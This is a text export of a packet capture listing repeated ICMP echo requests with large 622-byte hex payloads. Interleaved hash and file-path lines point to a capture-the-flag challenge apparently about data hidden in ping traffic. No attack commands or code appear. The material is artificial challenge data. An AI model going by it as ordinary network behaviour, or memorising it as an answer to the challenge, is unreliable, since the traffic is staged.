	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0xe886 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 263]
	    Data (622 bytes)
	
ae8a53e5284f5ccac36eaa9b31ed1c68|file:///home/neo/ccsc/echoes/bytes.txt|3940|1|V|text
	        Data: 091948953ae243fe52e73ce204e372c4a641951a92709b20‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    260 25.088097265   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 261)
	
	Frame 260: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x683f [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 261]
	    Data (622 bytes)
	
9057a22a6078fe7f0fda9d7ec8cb6ea3|file:///home/neo/ccsc/echoes/bytes.txt|3940|1|V|text
	        Data: da2ed3e07b9fb373c776d2b4499aa4d8b19456ab45eef420‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    266 26.710187614   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 267)
	
	Frame 266: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x0228 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 267]
	    Data (622 bytes)
	
86e6455b309e78aeee3e872901abdaa0|file:///home/neo/ccsc/echoes/bytes.txt|3940|1|V|text
	        Data: 19bc382438d9188c865d1843bbdd062358121a9260ada5d1‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    264 26.163122131   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 265)
	
	Frame 264: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x5c20 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 265]
	    Data (622 bytes)
	
e725724d8c7d97801d04348d601b5c27|file:///home/neo/ccsc/echoes/bytes.txt|3940|1|V|text
	        Data: be9314433e9591b52611abc4370bd97dacf718311ae1b100‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    270 27.797844338   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 271)
	
	Frame 270: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x8b07 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 271]
	    Data (622 bytes)
	
cbc0b049c0c3df82f65b3bfba79461cc|file:///home/neo/ccsc/echoes/bytes.txt|3940|1|V|text
	        Data: f0789cc058b3094668b5db58ab29d8ac4d34a4a2e9c8f21c‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    268 27.250788192   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 269)
	
	Frame 268: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0xf9ba [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 269]
	    Data (622 bytes)
	
a0d2b46e717219c591e04aa276b88419|file:///home/neo/ccsc/echoes/bytes.txt|3940|1|V|text
	        Data: d394f166833410be24b1ea1d9a3602414c3041ed99a4161b‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    272 28.330731433   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 273)
	
	Frame 272: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0xca4d [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 273]
	    Data (622 bytes)
	
6e67ce3f2e2254678e21d634fe4b0a49|file:///home/neo/ccsc/echoes/bytes.txt|3940|1|V|text
	        Data: 127543c68886528812bca461110bc6390c9a762d2934b019‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    274 28.869009067   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 275)
	
	Frame 274: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x3f6c [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 275]
	    Data (622 bytes)
	
8c276e8f250e479f92f523f88013dc17|file:///home/neo/ccsc/echoes/bytes.txt|3940|1|V|text
	        Data: 7c6983f1b1268db131d231557bda2021e245b515a289b413‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    276 29.405494366   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 277)
	
	Frame 276: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x2fb5 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 277]
	    Data (622 bytes)
	
4e4e085d1756d25fb2f130a5b272bc10|file:///home/neo/ccsc/echoes/bytes.txt|3940|1|V|text
	        Data: eac7c7d421931c8f43f0451695a85ad1e809870435a95721‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    278 29.937521078   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 279)
	
	Frame 278: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x6a58 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 279]
	    Data (622 bytes)
	
19ac4df8446204292d51d238904a6a8b|file:///home/neo/ccsc/echoes/bytes.txt|3940|1|V|text
	        Data: 43f0b2144d485621925d5e35155bcdd06d053504d10435a5‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    280 30.473585011   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 281)
	
	Frame 280: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x492f [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 281]
	    Data (622 bytes)
	
04eeb355f5b5350eb26746df46ef7167|file:///home/neo/ccsc/echoes/bytes.txt|3940|1|V|text
	        Data: d2bee7716a578cbfbd21b1908966acf15e886750588044d8‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    282 31.001673496   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 283)
	
	Frame 282: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0xe76f [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 283]
	    Data (622 bytes)
	
6cc88d6c2d134fbb1abe36a334e9517e|file:///home/neo/ccsc/echoes/bytes.txt|3940|1|V|text
	        Data: a61cb0ff7edc72e36aeebdf7de623e1efa10253cc3a31ef5‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    284 31.533716790   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 285)
	
	Frame 284: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x51d5 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 285]
	    Data (622 bytes)
	
8b778777536193f7aaa0bdcae3ae3d87|file:///home/neo/ccsc/echoes/bytes.txt|3940|1|V|text
	        Data: 61c3867df9e847ff91238f3c1280fbefbf9f0b2fbc90db6e‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    286 32.066180620   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 287)
	
	Frame 286: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x9684 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 287]
	    Data (622 bytes)
	
f66873ac60641946182fcc179b9e78be|file:///home/neo/ccsc/echoes/bytes.txt|3940|1|V|text
	        Data: cdd2191f1f27cf732ebbec329ef5ac67b16ad5ca9e67366d‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    290 33.132794766   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 291)
	
	Frame 290: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0xac3b [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 291]
	    Data (622 bytes)
	
0844bb9367f1c309a0f809d20cfa3000|file:///home/neo/ccsc/echoes/bytes.txt|3940|1|V|text
	        Data: cf3def79cfe3e52f7f39d65aaebbee3a5ef39ad7f0d39ffe‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    288 32.601332586   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 289)
	
	Frame 288: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x88cd [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 289]
	    Data (622 bytes)
	
95f3876ea9093a001f903854bca30e04|file:///home/neo/ccsc/echoes/bytes.txt|3940|1|V|text
	        Data: 312908bf74e2ba5a9c570a23d328b4fa401cbce1edbddf38‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    292 33.669348491   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 293)
	
	Frame 292: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x603c [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 293]
	    Data (622 bytes)
	
c210fb3a366ed1335ef07c555ad38595|file:///home/neo/ccsc/echoes/bytes.txt|3940|1|V|text
	        Data: a82b7daedea4560c8935246210e711a712a7beae88c78860‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    294 34.218834343   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 295)
	
	Frame 294: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x7a8c [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 295]
	    Data (622 bytes)
	
d310faeeca0dba8eb87fb68a8439b69d|file:///home/neo/ccsc/echoes/bytes.txt|3940|1|V|text
	        Data: e772c0231f39273c546526bbb568f1cf0e7b68852d56956e‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    298 35.296792340   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 299)
	
	Frame 298: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x208b [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 299]
	    Data (622 bytes)
	
b5574cac14a40f6cef186ef5a2de67d2|file:///home/neo/ccsc/echoes/bytes.txt|3940|1|V|text
	        Data: 9a62626282f1f1711a8d4687bb3f94eb539d789a78ef69b7‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    296 34.761804247   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 297)
	
	Frame 296: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x5ae5 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 297]
	    Data (622 bytes)
	
9c9fb5dbff86f08bd776d897eae351f4|file:///home/neo/ccsc/echoes/bytes.txt|3940|1|V|text
	        Data: afdb7a28f7aa45b014ae4cfd54bd8507d260f8babb257387‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    300 35.829750757   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 301)
	
	Frame 300: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x6600 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 301]
	    Data (622 bytes)
	
1a0ecc277f2b927fb86bd01422d0e2fa|file:///home/neo/ccsc/echoes/bytes.txt|3940|1|V|text
	        Data: b10f44cc4871120818725766a511a3e11efeff93f7e67172‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    302 36.371313069   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 303)
	
	Frame 302: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0xef2a [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 303]
	    Data (622 bytes)
	
2ef2879b1822720ab3f594216a6147fe|file:///home/neo/ccsc/echoes/bytes.txt|3940|1|V|text
	        Data: 4c16b446496d45a026237d1445389662ad542a066909131d‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    304 36.934877019   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 305)
	
	Frame 304: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x208e [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 305]
	    Data (622 bytes)
	
8862367d8c0277c738265e4857f5a1da|file:///home/neo/ccsc/echoes/bytes.txt|3940|1|V|text
	        Data: b76d4dac295f12c4f390fe349cd7d42b406234b54bd7f1c4‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    306 37.472761427   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 307)
	
	Frame 306: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x0807 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 307]
	    Data (622 bytes)
	
4db177cd6841dd5113fa56bcfdecfbae|file:///home/neo/ccsc/echoes/bytes.txt|3940|1|V|text
	        Data: 7926a99eb44048e36611595d8a5026cc16682a159fb172c0‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    308 38.004766609   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 309)
	
	Frame 308: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0xc521 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 309]
	    Data (622 bytes)
	
9dc154bc9dad351f2ece46d75a849682|file:///home/neo/ccsc/echoes/bytes.txt|3940|1|V|text
	        Data: 36ec30a5c591d027969de8a0b440d4b1d9c9a249ab2752c6‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    310 38.541382756   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 311)
	
	Frame 310: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0xf1a6 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 311]
	    Data (622 bytes)
	
8f866d88fd09bd3e180d120fbd0ec248|file:///home/neo/ccsc/echoes/bytes.txt|3940|1|V|text
	        Data: 4cd06e21240a41a88dc8d24199006e961355029492897816‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    312 39.073064369   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 313)
	
	Frame 312: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x558d [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 313]
	    Data (622 bytes)
	
b260fa126656fc9474268d70f681e98e|file:///home/neo/ccsc/echoes/bytes.txt|3940|1|V|text
	        Data: 93e66ab1dd0beaa9de57a5f2f87bbc57a72ee19a50d4abd2‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    314 39.608931003   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 315)
	
	Frame 314: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x4424 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 315]
	    Data (622 bytes)
	
6a9af3db514b958a8bca3774571c6a4d|file:///home/neo/ccsc/echoes/bytes.txt|3940|1|V|text
	        Data: e3bb49f566f1fad0d5b7e27284a5b81bcddd84799db8e86a‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    316 40.142613901   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 317)
	
	Frame 316: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x985f [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 317]
	    Data (622 bytes)
	
3efedb3929d070542264d6bad2a005c1|file:///home/neo/ccsc/echoes/bytes.txt|3940|1|V|text
	        Data: 9e47638228bb8e6b749a9e260c02e30a1186c64fd1513548‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    318 40.689700974   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 319)
	
	Frame 318: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x9835 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 319]
	    Data (622 bytes)
	
945784e4f794534a9a832d625c897ae2|file:///home/neo/ccsc/echoes/bytes.txt|3940|1|V|text
	        Data: 3dbcb8e1454646461a0814abdce492254b58b87021b367cf‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    320 41.225465014   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 321)
	
	Frame 320: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0xdda7 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 321]
	    Data (622 bytes)
	
fcef539c7170a469c1846f3cb801ff2f|file:///home/neo/ccsc/echoes/bytes.txt|3940|1|V|text
	        Data: 4d747575118621175f7c313ff9c94f9276082138fcf0c3b9‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    322 41.764969944   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 323)
	
	Frame 322: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x6c6c [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
